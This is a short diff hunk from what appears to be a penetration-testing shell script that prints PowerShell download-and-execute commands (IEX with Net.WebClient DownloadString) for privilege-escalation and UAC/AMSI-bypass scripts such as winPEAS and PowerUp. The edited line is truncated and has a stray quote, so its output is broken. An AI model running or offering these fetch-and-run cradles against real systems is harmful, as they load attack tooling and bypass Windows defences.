@@ -66,7 +66,7 @@ for script in powerup.ps1 winpeas.ps1 winpwn.ps1 uac-bypass.ps1 amsi-bypass.ps1.
     echo "--------------------"
     
     # Method 1: Standard IEX with WebClient
-    print_command "powershell -nop -exec bypass -c \"IEX((New-Object Net.WebClient).DownloadString('$url'))\""
+    print_command IEX((New-Object Net.WebClient).DownloadString('$url'))\"
     echo
 done
 
